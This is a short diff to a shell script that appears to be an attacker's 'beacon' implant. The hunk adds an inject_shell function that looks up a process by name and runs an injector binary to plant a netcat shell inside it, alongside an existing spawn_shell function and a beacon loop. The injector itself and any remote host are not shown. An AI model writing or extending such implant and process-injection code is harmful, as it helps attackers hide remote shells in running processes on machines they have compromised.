@@ -84,6 +84,13 @@ spawn_shell(){
     done
 }
 
+# Inject a nc shell into the specified process
+inject_shell(){
+    pname=$1
+    pid=$(pgrep $pname)
+    ./inject_shell $pid
+}
+
 # Main driver for beacon
 main(){
     while true; do
